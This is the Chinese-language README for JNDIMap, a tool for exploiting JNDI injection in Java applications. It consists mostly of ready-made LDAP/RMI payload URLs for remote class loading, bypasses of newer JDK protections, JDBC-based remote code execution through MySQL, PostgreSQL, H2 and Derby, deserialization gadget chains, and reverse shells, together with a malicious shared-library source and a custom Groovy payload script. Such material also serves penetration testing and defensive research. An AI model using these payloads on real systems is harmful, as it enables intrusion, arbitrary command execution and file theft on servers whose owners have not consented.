# JNDIMap

[English](README-en.md)

JNDIMap 是一个 JNDI 注入利用工具, 支持 RMI 和 LDAP 协议, 包含多种高版本 JDK 绕过方式

目前支持以下功能

- DnsLog
- 命令执行
- 原生反弹 Shell (支持 Windows)
- 加载自定义 Class 字节码
- Tomcat/Groovy/SnakeYaml Bypass
- Commons DBCP/Tomcat DBCP/Alibaba Druid/HikariCP JDBC RCE
- NativeLibLoader 加载动态链接库
- MLet 探测可用 Class
- LDAP 反序列化
- 自定义 JNDI Payload (基于 Groovy 语言)

## Build

目前 Release 版本暂未发布, 推荐手动编译

```bash
git clone https://github.com/X1r0z/JNDIMap
cd JNDIMap
mvn package -Dmaven.test.skip=true
```

## Usage

```bash
Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-p <httpPort>] [-u <url>] [-f <file>] [-h]
````

`-i`: 服务器监听 IP (即 codebase, 必须指定为一个目标可访问到的 IP, 例如 `192.168.1.100`, 不能用 `0.0.0.0`)

`-r`: RMI 服务器监听端口, 默认为 `1099`

`-l`: LDAP 服务器监听端口, 默认为 `1389`

`-p`: HTTP 服务器监听端口, 默认为 `3456`

`-u`: 手动指定 JNDI 路由, 例如 `/Basic/Command/open -a Calculator` (某些场景的 JNDI URL 并不完全可控)

`-f`: Groovy 脚本路径, 用于编写自定义 JNDI Payload

`-h`: 显示 Usage 信息

## Feature

注意传入的 Base64 均为 **Base64 URL 编码**, 即把 `+` 和 `/` 替换为 `-` 和 `_`

以下路由除 `/Deserialize/*` (LDAP 反序列化) 以外, 均支持 RMI 和 LDAP 协议

对于 RMI 协议, 只需要将 `ldap://127.0.0.1:1389/` 替换为 `rmi://127.0.0.1:1099/` 即可

### Basic

直接通过 JNDI Reference 加载远程 Class

Java 版本需小于 8u121 (RMI 协议) 或 8u191 (LDAP 协议)

```bash
# 发起 DNS 请求
ldap://127.0.0.1:1389/Basic/DnsLog/xxx.dnslog.cn

# 命令执行
ldap://127.0.0.1:1389/Basic/Command/open -a Calculator
ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==

# 加载自定义 Class 字节码

# URL 传参加载
ldap://127.0.0.1:1389/Basic/FromCode/<base64-java-bytecode>
# 从运行 JNDIMap 的服务器上加载字节码
ldap://127.0.0.1:1389/Basic/FromPath/<base64-path-to-evil-class-file>

# 原生反弹 Shell (支持 Windows)
ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444
```

### Bypass

通过以下方式绕过高版本 JDK 限制, 支持 Basic 所有功能

- Tomcat ELProcessor
- Groovy ClassLoader/Shell
- SnakeYaml

上述方式均依赖于 BeanFactory, 因此 Tomcat 版本需小于 8.5.79

```bash
# Tomcat Bypass
ldap://127.0.0.1:1389/TomcatBypass/Command/open -a Calculator

# Groovy Bypass
ldap://127.0.0.1:1389/GroovyClassLoader/Command/open -a Calculator
ldap://127.0.0.1:1389/GroovyShell/Command/open -a Calculator

# SnakeYaml Bypass
ldap://127.0.0.1:1389/SnakeYaml/Command/open -a Calculator
```

### MLet

通过 MLet 探测 classpath 中存在的类

如果 `com.example.TestClass` 这个类存在, 则 HTTP 服务器会接收到一个 `/com/example/TestClass_exists.class` 请求

```bash
ldap://127.0.0.1:1389/MLet/com.example.TestClass
```

### NativeLibLoader

通过 NativeLibLoader 加载目标服务器上的动态链接库

需要先提前以其它方式在目标机器上写入一个 dll/so/dylib

注意传入的 path 为绝对路径, 且不能包含后缀名

例如: 服务器上存在 `/tmp/evil.so`, 则 path 为 `/tmp/evil`

```bash
ldap://127.0.0.1:1389/NativeLibLoader/<base64-path-to-native-library>
```

动态链接库源码

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

__attribute__ ((__constructor__)) void preload (void){
    system("open -a Calculator");
}
```

编译

```bash
# macOS
gcc -shared -fPIC exp.c -o exp.dylib

# Linux
gcc -shared -fPIC exp.c -o exp.so
```

### JDBC RCE

支持以下数据库连接池的 JDBC RCE

- Commons DBCP
- Tomcat DBCP
- Alibaba Druid
- HikariCP

将 URL 中的 Factory 替换为 CommonsDBCP1/CommonsDBCP2/TomcatDBCP1/TomcatDBCP2/Druid/HikariCP 其中之一

#### MySQL

**MySQL JDBC 反序列化**

```bash
# detectCustomCollations (5.1.19-5.1.48, 6.0.2-6.0.6)
ldap://127.0.0.1:1389/Factory/MySQL/Deserialize1/127.0.0.1/3306/root

# ServerStatusDiffInterceptor

# 5.1.11-5.1.48
ldap://127.0.0.1:1389/Factory/MySQL/Deserialize2/127.0.0.1/3306/root

# 6.0.2-6.0.6
ldap://127.0.0.1:1389/Factory/MySQL/Deserialize3/127.0.0.1/3306/root

# 8.0.7-8.0.19
ldap://127.0.0.1:1389/Factory/MySQL/Deserialize4/127.0.0.1/3306/root
```

JDBC URL (供参考)

```bash
# detectCustomCollations (5.1.19-5.1.48, 6.0.2-6.0.6)
jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=123

# ServerStatusDiffInterceptor

# 5.1.11-5.1.48
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=test

# 6.0.2-6.0.6
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=test

# 8.0.7-8.0.19
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=test
```

**MySQL 客户端任意文件读取**

```bash
# 全版本
ldap://127.0.0.1:1389/Factory/MySQL/FileRead/127.0.0.1/3306/root
```

JDBC URL (供参考)

```bash
# 全版本
jdbc:mysql://127.0.0.1:3306/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/&maxAllowedPacket=655360
```

上述两种方式均需要搭配恶意 MySQL 服务端使用

[https://github.com/4ra1n/mysql-fake-server](https://github.com/4ra1n/mysql-fake-server)

[https://github.com/rmb122/rogue_mysql_server](https://github.com/rmb122/rogue_mysql_server)

[https://github.com/fnmsd/MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server)

#### PostgreSQL

通过 PostgreSQL JDBC URL 的 socketFactory 和 socketFactoryArg 参数实例化 ClassPathXmlApplicationContext 实现 RCE

```bash
ldap://127.0.0.1:1389/Factory/PostgreSQL/Command/open -a Calculator
````

#### H2

通过 H2 JDBC URL 的 INIT 参数执行 SQL 语句

三种方式 RCE: CREATE ALIAS/Groovy/JavaScript

```bash
ldap://127.0.0.1:1389/Factory/H2/Alias/open -a Calculator
ldap://127.0.0.1:1389/Factory/H2/Groovy/open -a Calculator
ldap://127.0.0.1:1389/Factory/H2/JavaScript/open -a Calculator
```

#### Derby

**Derby SQL RCE**

支持执行命令和原生反弹 Shell

```bash
# 1. 加载远程 jar 并创建相关存储过程 (会自动创建数据库)
ldap://127.0.0.1:1389/Factory/Derby/Install/<database>

# 2. 执行命令/原生反弹 Shell
ldap://127.0.0.1:1389/Factory/Derby/Command/<database>/open -a Calculator
ldap://127.0.0.1:1389/Factory/Derby/ReverseShell/<database>/ReverseShell/127.0.0.1/4444

# 3. 删除数据库以释放内存
ldap://127.0.0.1:1389/Factory/Derby/Drop/<database>
```

注意 HikariCP 的 connectionInitSql 参数不支持一次性执行多条 SQL 语句, 因此上述 **Install** 过程需要分开写

```bash
# 1. 加载远程 jar (会自动创建数据库)
ldap://127.0.0.1:1389/HikariCP/Derby/InstallJar/<database>

# 2. 将 jar 加入 classpath
ldap://127.0.0.1:1389/HikariCP/Derby/AddClassPath/<database>

# 3. 创建命令执行的存储过程
ldap://127.0.0.1:1389/HikariCP/Derby/CreateCmdProc/<database>

# 4. 创建反弹 Shell 的存储过程
ldap://127.0.0.1:1389/HikariCP/Derby/CreateRevProc/<database>

# 后续 JNDI URL 同上
```

为了防止恶意 jar 落地, JNDIMap 选择使用 `jdbc:derby:memory:<database>` 形式的 JDBC URL 以在内存中创建数据库

因此最好不要多次执行 Install/InstallJar 路由, 并且记得 Drop 数据库以释放内存

**Derby 主从复制反序列化 RCE**

JNDI 本身就支持反序列化, 意义不大, 可能在某些比较极限的场景下有用 (例如过滤了 LDAP 协议, 仅支持 RMI)

```bash
# 1. 创建内存数据库
ldap://127.0.0.1:1389/Factory/Derby/Create/<database>

# 2. 使用 JNDIMap 快速启动恶意 Derby Server
java -cp JNDIMap.jar map.jndi.server.DerbyServer -g "/CommonsCollectionsK1/Command/open -a Calculator"

# 3. 指定 Slave 信息, database 即为上面创建的数据库名称
ldap://127.0.0.1:1389/Factory/Derby/Slave/<ip>/<port>/<database>
```

启动内置的恶意 Derby Server

```bash
Usage: java -cp JNDIMap.jar map.jndi.server.DerbyServer [-p <port>] [-g <gadget>] [-f <file>] [-h]
```

`-p`: Derby Server 监听端口, 默认为 `4851`

`-g`: 指定 Gadget, 如 `/CommonsCollectionsK1/Command/open -a Calculator` (即下文 `/Deserialize/*` 系列路由)

`-f`: 指定自定义序列化数据文件

`-h`: 显示 Usage 信息

### Deserialize

即 LDAP 反序列化, 不支持 RMI 协议

JNDIMap 内置以下利用链, 同时也支持自定义数据反序列化

- CommonsCollections K1-K4
- CommonsBeanutils (1.8.3 + 1.9.4)
- Jackson

```bash
# 自定义数据反序列化
ldap://127.0.0.1:1389/Deserialize/<base64-serialize-data>

# CommonsCollectionsK1 反序列化 (3.1 + TemplatesImpl), 支持命令执行和反弹 Shell
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/ReverseShell/127.0.0.1/4444

# CommonsCollectionsK2 反序列化 (4.0 + TemplatesImpl), 功能同上
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK2/Command/open -a Calculator

# CommonsCollectionsK3 反序列化 (3.1 + Runtime.exec), 仅支持命令执行
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==

# CommonsCollectionsK4 反序列化 (4.0 + Runtime.exec), 功能同上
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK4/Command/open -a Calculator

# CommonsBeanutils 反序列化
# 无需 commons-collections 依赖, 使用 TemplatesImpl, 支持命令执行和反弹 Shell
# 根据 BeanComparator serialVersionUID 不同, 分为两个版本: 1.8.3 和 1.9.4

# 1.8.3
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/ReverseShell/127.0.0.1/4444

# 1.9.4
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/ReverseShell/127.0.0.1/4444

# Jackson 原生反序列化
# 使用 JdkDynamicAopProxy 优化不稳定性问题, 需要 spring-aop 依赖
ldap://127.0.0.1:1389/Deserialize/Jackson/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/Jackson/ReverseShell/127.0.0.1/4444
```

### Custom

JNDIMap 支持使用 [Groovy](https://groovy-lang.org/) 语言编写自定义 JNDI Payload

Groovy 脚本 (以 H2 RCE 为例)

```groovy
import javax.naming.Reference
import javax.naming.StringRefAddr

def list = []
list << "CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"test\"\\;}'"
list << "CALL EXEC('$args')" // 参数通过 args 变量传入

def url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=${list.join('\\;')}\\;"

def ref = new Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null)
ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"))
ref.add(new StringRefAddr("jdbcUrl", url))

return ref // 返回 Reference 对象
```

运行 JNDIMap

```bash
java -jar JNDIMap.jar -f /path/to/evil.groovy
```

通过以下 JNDI URL 实现 RCE

```bash
# 支持手动向 Groovy 脚本传入参数
ldap://127.0.0.1:1389/Custom/<args>
```

如果在某些情况下, 无法完全控制 JNDI URL, 可以指定 `-u` 参数

```bash
java -jar JNDIMap.jar -f /path/to/evil.groovy -u "/Custom/open -a Calculator"
```

然后通过任意 JNDI URL 触发

```bash
ldap://127.0.0.1:1389/x
```

## Reference

[https://tttang.com/archive/1405/](https://tttang.com/archive/1405/)

[https://paper.seebug.org/1832/](https://paper.seebug.org/1832/)

[https://xz.aliyun.com/t/12846](https://xz.aliyun.com/t/12846)

[http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce](http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce)

[https://www.yulegeyu.com/2022/11/12/Java 安全攻防之老版本 Fastjson 的一些不出网利用/](https://www.yulegeyu.com/2022/11/12/Java%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E4%B9%8B%E8%80%81%E7%89%88%E6%9C%ACFastjson-%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/)

[https://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/](https://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/)